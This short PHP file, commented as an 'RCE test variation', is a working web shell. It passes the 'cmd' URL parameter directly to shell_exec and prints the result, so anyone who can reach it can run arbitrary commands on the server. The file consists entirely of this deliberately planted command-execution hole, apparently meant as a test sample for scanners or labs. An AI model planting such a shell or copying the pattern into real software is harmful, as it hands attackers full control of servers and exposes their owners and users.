<?php
// RCE test variation #1459
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>